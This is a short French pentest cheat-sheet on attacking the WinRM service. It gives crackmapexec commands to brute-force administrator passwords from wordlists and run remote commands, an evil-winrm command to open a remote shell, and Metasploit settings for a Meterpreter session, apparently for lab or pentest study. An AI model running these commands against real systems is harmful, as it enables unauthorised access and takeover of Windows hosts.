# WinRM
WinRM est un protocole de gestion à distance qui utilise HTTP(s) comme protocole de transport.  
Ports 5985 et 5986 (HTTPS).  

### crackmapexec
"crackmapexec" est un outil pour attaquer WinRM (mais aussi mssql, smb et ssh). Il faut préciser le protocole cible, l'IP cible, user et password.  
`crackmapexec winrm <IP_cible> -u administrator -p /usr/share/metasploit... ` permet de bruteforcer le service avec les listes indiquées.  

Une fois les credentials récupérées on peut envoyer des commandes à distance :  
`crackmapexec winrm <IP_cible> -u administrator -p PasswordOfTheDeath -x "systeminfo" `

### evil-winrm
Permet de récupérer un shell distant  
`evil-winrm.rb -u administrator -p 'PasswordOfTheDeath' -i <IP_CIBLE>`  

### Meterpreter avec Metasploit
Démarrer Metasploit :  
Ce module a besoin de connaitre les credentials pour être exécuté (avec evil-winrm ou crackmapexec)
`use exploit/windows/winrm/winrm_script_exec` (RHOSTS, RPORT, USERNAME, PASSWORD...)  
`set FORCE_VBS true`  
Puis lancer et on obtient un meterpreter.  
